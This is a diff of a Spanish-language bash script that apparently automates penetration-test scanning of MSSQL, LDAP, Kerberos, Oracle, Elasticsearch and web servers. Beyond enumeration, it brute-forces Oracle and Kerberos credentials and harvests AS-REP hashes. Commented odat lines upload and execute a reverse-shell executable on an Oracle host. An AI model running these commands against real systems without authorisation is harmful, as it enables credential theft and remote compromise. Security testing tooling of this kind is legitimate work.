 		grep "|" logs/enumeracion/"$ip"_1434_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .enumeracion/"$ip"_1434_info.txt 
 					
-		 echo ""
+		echo ""
  	done <servicios/mssql.txt
  		
 	#insert clean data	
 	insert_data
 fi
 		
-
-#LDAPS
-if [ -f servicios/ldaps.txt ]
-then
-	echo -e "$OKBLUE #################### LDAPS (`wc -l servicios/ldaps.txt`) ######################$RESET"	    
-	while read line       
-	do     					
-		ip=`echo $line | cut -f1 -d":"`
-		port=`echo $line | cut -f2 -d":"` 	
-		
-		echo -e "[+] Escaneando $ip:$port"	
-
-		echo -e "\t[+] Obteniendo dominio y dnsHostName"				
-		nmap -Pn -n -p $port --script ldap-rootdse $ip > logs/enumeracion/"$ip"_"$port"_LDAP.txt
-		dominio=`cat logs/enumeracion/"$ip"_"$port"_LDAP.txt | grep --color=never namingContexts | sed 's/|       namingContexts: //g' | head -1`
-		dnsHostName=`cat logs/enumeracion/"$ip"_"$port"_LDAP.txt | grep dnsHostName | awk '{print $3}'`
-		
-		echo $dnsHostName > .enumeracion/"$ip"_"$port"_dnsHostName.txt	
-				
-		if [ -z "$dominio" ]; then
-			dominio=`nmap -n -Pn -sT -p $port --script ldap-rootdse $ip | grep --color=never namingContexts | sed 's/|       namingContexts: //g' | head -1`
-		fi
-		
-		if [ -z "$dominio" ]; then
-			echo -e "\t[i] No se pudo obtener el dominio"
-		else
-			echo $dominio > .enumeracion/"$ip"_"$port"_dominio.txt			
-			echo -e "\t[+] Comprobando acceso anónimo"
-			echo "ldapsearch -x -p $port -h $ip -b $dominio -s sub \"(objectclass=*)\"" > logs/enumeracion/"$ip"_"$port"_directorioLDAP.txt 
-			ldapsearch -x -p $port -h $ip -b $dominio -s sub "(objectclass=*)" >> logs/enumeracion/"$ip"_"$port"_directorioLDAP.txt 
-			#ldapsearch -x -s base -b '' -H  ldap://my.lapdap.server "(objectClass=*)" "*" +  
-			egrep -iq "successful bind must be completed|Not bind|Invalid DN syntax|Can't contact LDAP server" logs/enumeracion/"$ip"_"$port"_directorioLDAP.txt 
-			greprc=$?
-			if [[ $greprc -eq 0 ]] ; then						
-				echo -e "\t$OKGREEN[i] Requiere autenticación $RESET"
-			else
-				# copiar el archivo menos la primera linea
-				tail -n +2 logs/enumeracion/"$ip"_"$port"_directorioLDAP.txt > .vulnerabilidades/"$ip"_"$port"_directorioLDAP.txt 
-				echo -e "\t$OKRED[!] Acceso anónimo detectado \n $RESET"
-			fi
-		
-		fi #fin sin dominio
-		
-													 
-		 echo ""
- 	done <servicios/ldaps.txt
-	
-	#insert clean data	
-	insert_data
-fi
-
 
 #CITRIX
 if [ -f servicios/citrix.txt ]
@@ -1668,11 +2905,21 @@ then
 		port=`echo $line | cut -f2 -d":"`	
 		echo -e "[+] Escaneando $ip:$port"																	
 		echo -e "\t[+] Probando enumeracion de elasticsearch"		
-		echo "msfconsole -x 'use auxiliary/scanner/elasticsearch/indices_enum;set RHOSTS $ip; run;exit'" >> logs/enumeracion/"$ip"_"$port"_elasticsearchIndices.txt 2>/dev/null
-		msfconsole -x "use auxiliary/scanner/elasticsearch/indices_enum;set RHOSTS $ip; run;exit" >> logs/enumeracion/"$ip"_"$port"_elasticsearchIndices.txt 2>/dev/null
-		grep --color=never "Indices found" logs/enumeracion/"$ip"_"$port"_elasticsearchIndices.txt  > .enumeracion/"$ip"_"$port"_elasticsearchIndices.txt 
+		echo -e "[+] Escaneando $ip:$port"	> logs/enumeracion/"$ip"_elasticsearch_indices.txt 2>/dev/null
+		echo "msfconsole -x 'use auxiliary/scanner/elasticsearch/indices_enum;set RHOSTS $ip; run;exit'" >> logs/enumeracion/"$ip"_elasticsearch_indices.txt 2>/dev/null
+		msfconsole -x "use auxiliary/scanner/elasticsearch/indices_enum;set RHOSTS $ip; run;exit" >> logs/enumeracion/"$ip"_elasticsearch_indices.txt 2>/dev/null
+		grep --color=never "Indices found" logs/enumeracion/"$ip"_elasticsearch_indices.txt  > .enumeracion/"$ip"_elasticsearch_indices.txt 
 	    #exploit/multi/elasticsearch/search_groovy_script 																	
-		 echo ""
+		 
+		#List all roles on the system:
+		echo "curl -X GET $ip:$port/_security/role"  > logs/enumeracion/"$ip"_elasticsearch_enum.txt 2>/dev/null
+		curl -X GET "$ip:$port/_security/role" >> logs/enumeracion/"$ip"_elasticsearch_enum.txt 2>/dev/null
+
+		#List all users on the system:
+		curl -X GET "$ip:$port/_security/user" >> logs/enumeracion/"$ip"_elasticsearch_enum.txt 2>/dev/null
+
+
+		
  	done <servicios/elasticsearch.txt
 				
 	#insert clean data	
@@ -1710,10 +2957,11 @@ then
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`
 		echo -e "[+] Escaneando $ip:$port"																	
-		echo -e "\t[+] Probando vulnerabilidad"				
+		echo -e "\t[+] Probando vulnerabilidad con oscanner"				
 		echo "oscanner -s $ip -P 1521" > logs/vulnerabilidades/"$ip"_"$port"_oscanner.txt 2>/dev/null
 		oscanner -s $ip -P $port -v >> logs/vulnerabilidades/"$ip"_"$port"_oscanner.txt 2>/dev/null	
 
+		echo -e "\t[+] Probando vulnerabilidad con nmap"				
 		echo "nmap --script oracle-brute -p $port --script-args oracle-brute.sid=ORCL $ip" > logs/vulnerabilidades/"$ip"_"$port"_oracleCreds.txt 2>/dev/null
 		nmap --script oracle-brute -p $port --script-args oracle-brute.sid=ORCL $ip >> logs/vulnerabilidades/"$ip"_"$port"_oracleCreds.txt 2>/dev/null
 		grep "|" logs/vulnerabilidades/"$ip"_"$port"_oracleCreds.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_"$port"_oracleCreds.txt	
@@ -1721,10 +2969,35 @@ then
 		echo "nmap -p $port --script=oracle-sid-brute $ip" > logs/vulnerabilidades/"$ip"_"$port"_oracleSids.txt 2>/dev/null
 		nmap -p $port --script=oracle-sid-brute $ip >> logs/vulnerabilidades/"$ip"_"$port"_oracleSids.txt 2>/dev/null
 		grep "|" logs/vulnerabilidades/"$ip"_"$port"_oracleSids.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_"$port"_oracleSids.txt	
+
+		echo "nmap -p $port --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n $ip" > logs/vulnerabilidades/"$ip"_"$port"_oracleStealth.txt 2>/dev/null
+		nmap -p $port --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n $ip >> logs/vulnerabilidades/"$ip"_"$port"_oracleStealth.txt 2>/dev/null
+		grep "|" logs/vulnerabilidades/"$ip"_"$port"_oracleStealth.txt 2>/dev/null | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_"$port"_oracleStealth.txt 
+	
+	
+		echo -e "\t[+] Probando vulnerabilidad con tnscmd10g"				
+		echo "tnscmd10g version -p 1521 -h $ip" > logs/enumeracion/"$ip"_"$port"_tnscmd10g.txt 2>/dev/null
+		tnscmd10g version -p 1521 -h $ip > logs/enumeracion/"$ip"_"$port"_tnscmd10g.txt 2>/dev/null		
+
+		echo "tnscmd10g services -p 1521 -h $ip" >> logs/enumeracion/"$ip"_"$port"_tnscmd10g.txt 2>/dev/null
+		tnscmd10g services -p 1521 -h $ip >> logs/enumeracion/"$ip"_"$port"_tnscmd10g.txt 2>/dev/null
+
+		echo "tnscmd10g debug -p 1521 -h $ip " >> logs/enumeracion/"$ip"_"$port"_tnscmd10g.txt 2>/dev/null
+		tnscmd10g debug -p 1521 -h $ip >> logs/enumeracion/"$ip"_"$port"_tnscmd10g.txt 2>/dev/null
+
+		cat logs/enumeracion/"$ip"_"$port"_tnscmd10g.txt 2>/dev/null > .enumeracion/"$ip"_"$port"_tnscmd10g.txt 2>/dev/null
 		
-													 
-		 echo ""
- 	done <servicios/oracle.txt	
+		#echo -e "\t[+] Probando vulnerabilidad con odat"
+		#odat.sh all -s $ip >> logs/vulnerabilidades/"$ip"_"$port"_odat.txt 2>/dev/null
+
+		echo -e "\t[+] Probando vulnerabilidad tnspoison"
+		msfconsole -x "use auxiliary/scanner/oracle/tnspoison_checker;set RHOSTS $ip; run;exit" >> logs/vulnerabilidades/"$ip"_"$port"_tnspoison.txt 2>/dev/null
+		grep "is vulnerable" logs/vulnerabilidades/"$ip"_"$port"_tnspoison.txt | sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g" > .vulnerabilidades/"$ip"_"$port"_tnspoison.txt 
+		
+		#odat.sh utlfile -s 10.10.10.82 -p 1521 -U "scott" -P "tiger" -d XE --putFile /temp shell.exe /opt/oscp/10.10.16.3-443.exe --sysdba
+		#odat.sh externaltable -s 10.10.10.82 -p 1521 -U "scott" -P "tiger" -d XE --exec /temp shell.exe --sysdba
+			
+	done <servicios/oracle.txt	
 	
 	#insert clean data	
 	insert_data
@@ -1792,80 +3065,6 @@ fi
 
 
 
-if [ -f servicios/ldap.txt ]
-then
-	echo -e "$OKBLUE #################### LDAP (`wc -l servicios/ldap.txt`) ######################$RESET"	    
-	while read line          
-	do        
-		ip=`echo $line | cut -f1 -d":"`
-		port=`echo $line | cut -f2 -d":"` 	
-		
-		echo -e "[+] Escaneando $ip:$port"	
-		echo -e "\t[+] Obteniendo dominio y dnsHostName"				
-		nmap -n -Pn -p $port --script ldap-rootdse $ip > logs/enumeracion/"$ip"_"$port"_LDAP.txt
-		dominioAD=`cat logs/enumeracion/"$ip"_"$port"_LDAP.txt | grep --color=never namingContexts | sed 's/|       namingContexts: //g' | head -1`
-		dnsHostName=`cat logs/enumeracion/"$ip"_"$port"_LDAP.txt | grep dnsHostName | awk '{print $3}'`
-		
-		echo $dnsHostName > .enumeracion/"$ip"_"$port"_dnsHostName.txt			
-		echo $dominioAD > .enumeracion/"$ip"_"$port"_dominio.txt		
-		###### LDAP ######
-		if [ -z "$dominioAD" ]; then			
-			echo -e "\t[i] No se pudo obtener el dominio "
-		else
-			echo -e "\t[+] Probando vulnerabilidad de conexión anónima con el dominio $dominio"
-			echo "ldapsearch -x -p $port -h $ip -b $dominioAD -s sub \"(objectclass=*)\"" > logs/vulnerabilidades/"$ip"_"$port"_directorioLDAP.txt 
-			ldapsearch -x -p $port -h $ip -b $dominioAD -s sub "(objectclass=*)" >> logs/vulnerabilidades/"$ip"_"$port"_directorioLDAP.txt 
-					
-			egrep -iq "successful bind must be completed|Not bind|Operation unavailable|Can't contact LDAP server" logs/vulnerabilidades/"$ip"_"$port"_directorioLDAP.txt 
-			greprc=$?
-			if [[ $greprc -eq 0 ]] ; then						
-				echo -e "\t$OKGREEN[i] Requiere autenticación $RESET"
-			else
-				echo -e "\t$OKRED[!] Conexión anónima detectada \n $RESET"
-				cp logs/vulnerabilidades/"$ip"_"$port"_directorioLDAP.txt .vulnerabilidades/"$ip"_"$port"_directorioLDAP.txt 
-			fi
-		
-		fi # fin sin dominio
-				
-		####################        
-		
-		 echo ""
- 	done <servicios/ldap.txt
-		
-	#insert clean data	
-	insert_data
-fi	
-
-
-if [ -f servicios/kerberos.txt ]
-then
-	echo -e "$OKBLUE #################### kerberos (`wc -l servicios/kerberos.txt`) ######################$RESET"	    		
-	for line in $(cat servicios/kerberos.txt); do
-        ip=`echo $line | cut -f1 -d":"`
-		port=`echo $line | cut -f2 -d":"` 	
-		
-		echo -e "[+] Escaneando $ip:$port"	
-		#DC=htb,DC=local		
-		dominioAD=`echo "${dominioAD/,DC=/.}"`
-		dominioAD=`echo "${dominioAD/DC=/}"`
-
-		echo -e "[+] \t kerbrute ($dominioAD)"	
-		kerbrute userenum $common_user_list --dc $ip -d $dominioAD --output logs/vulnerabilidades/"$ip"_"$port"_kerbrute.txt
-		grep "VALID USERNAME" logs/vulnerabilidades/"$ip"_"$port"_kerbrute.txt | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g"  > .vulnerabilidades/"$ip"_"$port"_kerbrute.txt
-		
-		GetNPUsers.py "$dominioAD"/ -no-pass -usersfile $common_user_list -format hashcat -dc-ip $ip > logs/vulnerabilidades/"$ip"_"$port"_kerberosHash.txt
-		grep "krb5as" logs/vulnerabilidades/"$ip"_"$port"_kerberosHash.txt > .vulnerabilidades/"$ip"_"$port"_kerberosHash.txt
-		# hashcat -m 18200 -a 0 hash.txt /media/sistemas/Passwords/Passwords/rockyou2021.txt -o cracked.txt #hash.txt tiene todos los datos no solo hash
-		
-		echo -e "[+] \t rpcEnumUsers"	
-		msfconsole -x "use auxiliary/scanner/smb/smb_enumusers;set RHOSTS $ip;run;exit" > logs/enumeracion/"$ip"_"$port"_rpcEnumUsers.txt 2>/dev/null							   
-		egrep --color=never -i "Administrator" logs/enumeracion/"$ip"_"$port"_rpcEnumUsers.txt  >> .enumeracion/"$ip"_"$port"_rpcEnumUsers.txt
-		
-			
-    done;           
-	insert_data
-    
-fi	
 
 
 
@@ -1901,7 +3100,7 @@ then
 		port=`echo $line | cut -f2 -d":"` 	
 		
 		echo -e "[+] Escaneando $ip:$port"				
-		web-buster.pl -t $ip -p $port -h $hilos_web -d / -m folders -s 0 -q 1 >> logs/enumeracion/"$ip"_"$port"_webdirectorios.txt  &			
+		web-buster.pl -t $ip -p $port -h $hilos_web -d / -m folders -s $proto -q 1 >> logs/enumeracion/"$ip"_"$port"_webdirectorios.txt  &			
 			
     done;       
     #insert clean data	
@@ -1921,7 +3120,32 @@ then
     echo -e "$OKGREEN[i] Identificacion de técnologia usada en los servidores web$RESET"
 	for line in $(cat servicios/web.txt); do  
 		ip=`echo $line | cut -f1 -d":"`
-		port=`echo $line | cut -f2 -d":"`					
+		port=`echo $line | cut -f2 -d":"`
+
+		
+		if [ $MODE == "extended" ]; then 							
+				echo -e "\t [+] Buscando mas virtual hosts"
+				DOMINIO_INTERNO=`nmap -Pn -sV -n -p $port $ip | grep 'Host:' | awk '{print $4}'`
+				echo -e "\t\t [+] main domain $DOMINIO_INTERNO"
+				if [ ! -z "$DOMINIO_INTERNO" ]; then
+
+					echo "$ip $DOMINIO_INTERNO" >> /etc/hosts
+					echo "wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.$DOMINIO_INTERNO' -u http://$DOMINIO_INTERNO -t 100 --hc 302 -f logs/enumeracion/'$ip'_'$port'_vhosts.txt"
+					wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.$DOMINIO_INTERNO" -u http://$DOMINIO_INTERNO -t 100 --hc 302 -f logs/enumeracion/"$ip"_"$port"_vhosts.txt	2>/dev/null
+					grep C=200 logs/enumeracion/"$ip"_"$port"_vhosts.txt | awk '{print $9}' | tr -d '"' > .enumeracion/"$ip"_"$port"_vhosts.txt
+					vhosts=`cat .enumeracion/"$ip"_"$port"_vhosts.txt`
+
+					for vhost in $vhosts; do					
+							echo -e "\t\t[+] Adicionando vhost $vhost a los targets"	
+							echo "$ip $vhost.$DOMINIO_INTERNO" >> /etc/hosts
+							echo "$ip,$vhost.$DOMINIO_INTERNO,vhost" >> $prefijo$IP_LIST_FILE						
+					done
+					
+				fi
+
+				
+		fi	
+
 		while true; do
 			free_ram=`free -m | grep -i mem | awk '{print $7}'`		
 			perl_instancias=$((`ps aux | grep perl | wc -l` - 1)) 			
@@ -1930,19 +3154,21 @@ then
 				echo -e "\t\t[+] Revisando server-status"
 				curl --max-time 2 http://$ip:$port/server-status 2>/dev/null | grep --color=never nowrap | sed 's/<\/td>//g' | sed 's/<td nowrap>/;/g' | sed 's/<\/td><td>//g'| sed 's/<\/td><\/tr>//g' | sed 's/amp;//g' > .enumeracion/"$ip"_"$port"_serverStatus.txt 
 				echo -e "\t[+] Obteniendo informacion web"
-				webData.pl -t $ip -p $port -s 0 -e todo -d / -l logs/enumeracion/"$ip"_"$port"_webData.txt -r 4 > .enumeracion/"$ip"_"$port"_webData.txt 2>/dev/null  &	
+				webData.pl -t $ip -p $port -s http -e todo -d / -l logs/enumeracion/"$ip"_"$port"_webData.txt -r 4 > .enumeracion/"$ip"_"$port"_webData.txt 2>/dev/null  &	
 				sleep 0.1;
+
+
 			
-				######## revisar por dominio #######
-				if grep -q "," "$prefijo$FILE" 2>/dev/null; then			
-					lista_subdominios=`grep $ip $prefijo$FILE | cut -d "," -f2`
+				######## revisar por subdominio #######
+				if grep -q "," "$prefijo$IP_LIST_FILE" 2>/dev/null; then			
+					lista_subdominios=`grep $ip $prefijo$IP_LIST_FILE | egrep 'subdomain|vhost'| cut -d "," -f2`
 					for subdominio in $lista_subdominios; do					
 						echo -e "\t\t[+] Obteniendo informacion web (subdominio: $subdominio)"	
 						# Una sola rediccion (-r 1) para evitar que escaneemos 2 veces el mismo sitio
-						webData.pl -t $subdominio -p $port -s 0 -e todo -d / -l logs/enumeracion/"$subdominio"_"$port"_webData.txt -r 1 > .enumeracion/"$subdominio"_"$port"_webData.txt 2>/dev/null 						
+						webData.pl -t $subdominio -p $port -s http -e todo -d / -l logs/enumeracion/"$subdominio"_"$port"_webData.txt -r 1 > .enumeracion/"$subdominio"_"$port"_webData.txt 2>/dev/null 						
 					done
 				fi
-				################################	
+				###############################
 				break												
 			else				
 				perl_instancias=`ps aux | grep perl | grep -v grep | wc -l`
@@ -1977,14 +3203,15 @@ then
 			perl_instancias=$((`ps aux | grep perl | wc -l` - 1)) 
 			#if [[ $free_ram -gt $min_ram && $perl_instancias -lt 10  ]];then 
 			if [[ $free_ram -gt $min_ram && $perl_instancias -lt $max_perl_instancias  ]];then 
-			#echo "FILE $prefijo$FILE"			
+			#echo "FILE $prefijo$IP_LIST_FILE"			
 				#################  Realizar el escaneo por dominio  ##############				
-				if grep -q "," "$prefijo$FILE" 2>/dev/null; then
-					lista_subdominios=`grep --color=never $ip -a $prefijo$FILE | cut -d "," -f2`
+				if grep -q "," "$prefijo$IP_LIST_FILE" 2>/dev/null; then
+					lista_subdominios=`grep --color=never $ip -a $prefijo$IP_LIST_FILE | cut -d "," -f2`
 					#echo "lista_subdominios $lista_subdominios"
 					for subdominio in $lista_subdominios; do													
 						echo -e "\t[+] subdominio: $subdominio"							
 						#wget --timeout=20 --tries=1 http://$subdominio -O webClone/http-$subdominio.html
+
 						curl.pl --url  http://$subdominio > webClone/http-$subdominio.html												
     
 						sed -i "s/\/index.php//g" webClone/http-$subdominio.html
@@ -2020,99 +3247,21 @@ then
 						if [[ ($hostOK -eq 1 &&  $noEscaneado -eq 1) || ($accesoDenegado -eq 0)]];then  # El sitio no fue escaneado antes/no redirecciona a otro dominio. Si sale acceso denegado escanear por directorios
 							echo "Realizando tests adicionales "
 							echo $checksumline >> webClone/checksumsEscaneados.txt
-							if [ $internet == "s" ]; then 	
-								echo -e "\t\t[+] identificar si el host esta protegido por un WAF "
-								wafw00f http://$subdominio:$port > logs/enumeracion/"$subdominio"_"$port"_wafw00f.txt
-								grep "is behind" logs/enumeracion/"$subdominio"_"$port"_wafw00f.txt > .enumeracion/"$subdominio"_"$port"_wafw00f.txt								
-	
-								echo -e "\t\t[+] Detectando si hay balanceador de carga"							
-								lbd $subdominio > logs/enumeracion/"$subdominio"_web_balanceador.txt
-								grep "does Load-balancing" logs/enumeracion/"$subdominio"_web_balanceador.txt > .enumeracion/"$subdominio"_web_balanceador.txt								
-							fi	
-    
-							
+						
+							echo -e "\t\t[+] identificar si el host esta protegido por un WAF "
+							wafw00f http://$subdominio:$port > logs/enumeracion/"$subdominio"_"$port"_wafw00f.txt
+							grep "is behind" logs/enumeracion/"$subdominio"_"$port"_wafw00f.txt > .enumeracion/"$subdominio"_"$port"_wafw00f.txt								
+
+							echo -e "\t\t[+] Detectando si hay balanceador de carga"							
+							lbd $subdominio > logs/enumeracion/"$subdominio"_web_balanceador.txt
+							grep "does Load-balancing" logs/enumeracion/"$subdominio"_web_balanceador.txt > .enumeracion/"$subdominio"_web_balanceador.txt															
+    							
 
   							###  if the server is apache ######
 							egrep -i "apache|nginx|kong" .enumeracion/"$subdominio"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud" # solo el segundo egrep poner "-q"
 							greprc=$?
-							if [[ $greprc -eq 0  ]];then # si el banner es Apache															
-												  
-								if [[ ${subdominio} != *"nube"* && ${subdominio} != *"webmail"* && ${subdominio} != *"cpanel"* && ${subdominio} != *"autoconfig"* && ${subdominio} != *"ftp"* && ${subdominio} != *"whm"* && ${subdominio} != *"webdisk"*  && ${subdominio} != *"autodiscover"* ]];then 
-									echo -e "\t\t[+] Revisando directorios comunes ($subdominio - Apache/nginx)"
-									web-buster.pl -t $subdominio  -p $port -h $hilos_web -d / -m folders -s 0 -q 1  >> logs/enumeracion/"$subdominio"_"$port"_webdirectorios.txt  &
-									sleep 1					
-								fi			
-
-								#  CVE-2021-4177								
-								echo -e "\t\t[+] Revisando apache traversal)" 
-								apache-traversal.py  --target  $subdominio --port $port > logs/vulnerabilidades/"$subdominio"_"$port"_apacheTraversal.txt  	
-								grep --color=never ":x:" logs/vulnerabilidades/"$subdominio"_"$port"_apacheTraversal.txt  > .vulnerabilidades/"$subdominio"_"$port"_apacheTraversal.txt
-
-								echo -e "\t\t[+] Revisando paneles administrativos ($subdominio - Apache/nginx)"
-								web-buster.pl -t $subdominio  -p $port -h $hilos_web -d / -m admin -s 0 -q 1  >> logs/enumeracion/"$subdominio"_"$port"_admin.txt
-								egrep --color=never "^200|^401" logs/enumeracion/"$subdominio"_"$port"_admin.txt > .enumeracion/"$subdominio"_"$port"_admin.txt 
-								sleep 1
-								
-								echo -e "\t\t[+] Revisando archivos comunes de servidor ($subdominio - Apache/nginx)"
-								web-buster.pl -t $subdominio  -p $port -h $hilos_web -d / -m webserver -s 0 -q 1 | egrep --color=never "^200" > .enumeracion/"$subdominio"_"$port"_webarchivos.txt  &
-								#web-buster.pl -t $subdominio  -p $port -h $hilos_web -d / -m webserver -s 0 -q 1 > logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt 
-								#egrep --color=never "^200" logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt > .enumeracion/"$subdominio"_"$port"_webarchivos.txt  
-								sleep 1
-
-								echo -e "\t\t[+] Revisando backups de archivos de configuración ($subdominio - Apache/nginx)"
-								web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m backupApache -s 0 -q 1 > logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt  
-								egrep --color=never "^200" logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt   >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt  
-								sleep 1
-								
-								echo -e "\t\t[+] Revisando backups de archivos php ($subdominio - Apache/nginx)"
-								web-buster.pl -t $subdominio -p $port -h 40 -d / -m php -s 0 -q 1 | egrep --color=never "^200" > .enumeracion/"$subdominio"_"$port"_webarchivos.txt  &
-								#web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m php -s 0 -q 1 > logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt  
-								#egrep --color=never "^200" logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt   >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt  
-								sleep 1
-								
-								echo -e "\t\t[+] Revisando backups de archivos genericos ($subdominio - Apache/nginx)"
-								web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m files -s 0 -q 1 > logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt  
-								egrep --color=never "^200" logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt   >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt  
-								sleep 1
-								
-								egrep -i "is behind" .enumeracion/"$subdominio"_"$port"_wafw00f.txt
-								greprc=$?
-								if [[ $greprc -eq 1 ]];then # si hay no hay firewall protegiendo la app								
-									echo -e "\t\t[+] Revisando archivos CGI ($subdominio - Apache/nginx)"
-									web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m cgi -s 0 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> servicios/cgi.txt; 
-									cat servicios/cgi.txt >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt
-									sleep 1								
-								fi																							
-							
-								
-								echo -e "\t\t[+] Revisando archivos peligrosos ($subdominio - Apache/nginx)"
-								web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m files2 -s 0 -q 1 > logs/vulnerabilidades/"$subdominio"_"$port"_archivosPeligrosos.txt  
-								egrep --color=never "^200" logs/vulnerabilidades/"$subdominio"_"$port"_archivosPeligrosos.txt  | awk '{print $2}' >> .vulnerabilidades/"$subdominio"_"$port"_archivosPeligrosos.txt  
-								sleep 1
-								
-								echo -e "\t\t[+] Revisando archivos por defecto ($subdominio - Apache/nginx)"
-								web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m default -s 0 -q 1 | egrep --color=never "^200" | awk '{print $2}' > .vulnerabilidades/"$subdominio"_"$port"_archivosDefecto.txt  &
-								#web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m default -s 0 -q 1 > logs/vulnerabilidades/"$subdominio"_"$port"_archivosDefecto.txt  
-#								egrep --color=never "^200" logs/vulnerabilidades/"$subdominio"_"$port"_archivosDefecto.txt  | awk '{print $2}' >> .vulnerabilidades/"$subdominio"_"$port"_archivosDefecto.txt  
-								sleep 1
-								
-								echo -e "\t\t[+] Revisando la existencia de backdoors ($subdominio - Apache/nginx)"
-								web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m backdoorApache -s 0 -q 1 > logs/vulnerabilidades/"$subdominio"_"$port"_webshell.txt 
-								egrep --color=never "^200" logs/vulnerabilidades/"$subdominio"_"$port"_webshell.txt  | awk '{print $2}' >> .vulnerabilidades/"$subdominio"_"$port"_webshell.txt 								
-								sleep 1
-								
-								echo -e "\t\t[+] Revisando si el registro de usuarios esta habilitado ($subdominio - Apache/nginx)"
-								web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m registroHabilitado -s 0 -q 1 > logs/vulnerabilidades/"$subdominio"_"$port"_registroHabilitado.txt 
-								egrep --color=never "^200" logs/vulnerabilidades/"$subdominio"_"$port"_registroHabilitado.txt  | awk '{print $2}' >> .vulnerabilidades/"$subdominio"_"$port"_registroHabilitado.txt
-								sleep 1
-								
-								echo -e "\t\t[+] Revisando la presencia de archivos phpinfo, logs, errors ($subdominio - Apache/nginx)"
-								web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m information -s 0 -q 1 | egrep --color=never "^200" | awk '{print $2}' > logs/enumeracion/"$subdominio"_"$port"_divulgacionInformacion.txt 2>/dev/null & # solo a la carpeta logs
-																							
-								echo -e "\t\t[+] Revisando vulnerabilidad slowloris ($subdominio)"
-								echo "nmap --script http-slowloris-check -p $port $subdominio" > logs/vulnerabilidades/"$subdominio"_"$port"_slowloris.txt 2>/dev/null
-								nmap -Pn --script http-slowloris-check -p $port $subdominio >> logs/vulnerabilidades/"$subdominio"_"$port"_slowloris.txt 2>/dev/null
-								grep "|" logs/vulnerabilidades/"$subdominio"_"$port"_slowloris.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$subdominio"_"$port"_slowloris.txt
+							if [[ $greprc -eq 0  ]];then # si el banner es Apache																							
+								enumeracionApache "http" $subdominio $port
 							else
 								echo -e "\t\t[+] No es Apache o no debemos escanear"
 							fi						
@@ -2121,48 +3270,8 @@ then
 							#######  if the server is IIS ######
 							grep -i IIS .enumeracion/"$subdominio"_"$port"_webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud"  # no redirecciona
 							greprc=$?
-							if [[ $greprc -eq 0  ]];then # si el banner es IIS 							
-								
-								if [[ ${subdominio} != *"nube"* && ${subdominio} != *"webmail"*  && ${subdominio} != *"autodiscover"* ]];then 
-									echo -e "\t\t[+] Revisando directorios comunes ($subdominio - IIS)"								
-									web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m folders -s 0 -q 1  >> logs/enumeracion/"$subdominio"_"$port"_webdirectorios.txt  &
-									sleep 1					
-								fi	
-								
-								echo -e "\t\t[+] Revisando vulnerabilidad HTTP.sys ($subdominio - IIS)"
-								echo "nmap -p $port --script http-vuln-cve2015-1635.nse $subdominio" >> logs/vulnerabilidades/"$subdominio"_"$port"_HTTPsys.txt
-								nmap -Pn -p $port --script http-vuln-cve2015-1635.nse $subdominio >> logs/vulnerabilidades/"$subdominio"_"$port"_HTTPsys.txt
-								grep --color=never "|" logs/vulnerabilidades/"$subdominio"_"$port"_HTTPsys.txt > .vulnerabilidades/"$subdominio"_"$port"_HTTPsys.txt
-								
-								echo -e "\t\t[+] Revisando paneles administrativos ($subdominio - IIS)"						
-								web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m admin -s 0 -q 1 >> logs/enumeracion/"$subdominio"_"$port"_admin.txt
-								egrep --color=never "^200|^401" logs/enumeracion/"$subdominio"_"$port"_admin.txt >> .enumeracion/"$subdominio"_"$port"_admin.txt  
-								sleep 1
-								
-								echo -e "\t\t[+] Revisando archivos comunes de servidor ($subdominio - IIS)"
-								web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m webserver -s 0 -q 1 > logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt &  
-								egrep --color=never "^200" logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt  >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt  
-								sleep 1
-								
